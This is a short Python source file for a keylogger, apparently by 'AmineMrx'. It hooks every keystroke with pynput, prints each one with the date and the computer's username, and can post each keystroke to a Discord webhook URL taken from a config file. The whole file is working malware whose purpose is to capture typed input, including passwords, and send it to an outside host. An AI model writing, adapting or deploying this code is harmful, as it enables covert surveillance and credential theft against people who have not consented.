try:
    from pynput.keyboard import Key, Listener
    import logging, json
    import os
    from datetime import date
    import datetime
    import time 
    from discord_webhook import DiscordWebhook, DiscordEmbed
except ImportError:
    print("Please install all packages")
pcname = os.getenv('username')

today = date.today()

with open("config.json") as f:
    ext = json.load(f)

def on_press(key):
    os.system("title Coded by AmineMrx | KeyLogger")
    print(f"| Date: {today} | KEY: {str(key)} | PC name: {pcname} |")
    if ext['webhook'] == "true":
        webhook = DiscordWebhook(url=ext['webhook-id'], content=f"| Date: {today} | KEY: {str(key)} | PC name: {pcname} |",  username=ext['webhook-name'])
        response = webhook.execute()
    else:
        pass
with Listener(on_press=on_press) as listener:
    listener.join()
